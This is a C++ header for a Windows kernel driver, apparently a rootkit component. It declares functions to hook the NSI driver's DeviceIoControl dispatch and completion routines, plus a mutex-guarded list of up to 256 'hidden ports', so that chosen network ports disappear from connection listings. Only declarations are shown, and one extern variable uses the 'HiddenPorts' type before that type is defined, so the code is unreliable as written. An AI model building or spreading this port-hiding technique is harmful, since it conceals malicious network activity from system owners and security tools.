#pragma once
#include <ntifs.h>
#include "FastMutex.h"
#include "AutoLock.h"

namespace NetworkHandler {
	NTSTATUS hookNsi();

	NTSTATUS unhookNsi();

	NTSTATUS hookedDeviceIoControl(PDEVICE_OBJECT  DeviceObject, PIRP  Irp);

	NTSTATUS hookedCompletionRoutine(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context);

	USHORT htons(USHORT port);

	void addHiddenPort(LIST_ENTRY* entry);

	void cleanHiddenPorts();

	extern "C" NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
		PUNICODE_STRING ObjectName,
		ULONG Attributes,
		PACCESS_STATE AccessState,
		ACCESS_MASK DesiredAccess,
		POBJECT_TYPE ObjectType,
		KPROCESSOR_MODE AccessMode,
		PVOID ParseContext OPTIONAL,
		PVOID * Object
	);

	extern "C" POBJECT_TYPE * IoDriverObjectType;

	extern PDRIVER_OBJECT pNsiDriverObject;
	extern PDRIVER_DISPATCH originalNsiDeviceIo;
	extern HiddenPorts HiddenPortsContext;

	struct HiddenPort
	{
		LIST_ENTRY Entry;
		USHORT HiddenPort;
	};

	struct HiddenPorts {
		LIST_ENTRY HiddenPortsHead;
		int HiddenPortsCount;
		FastMutex Mutex;
	};

	constexpr int MAX_HIDDEN_PORTS = 256;
}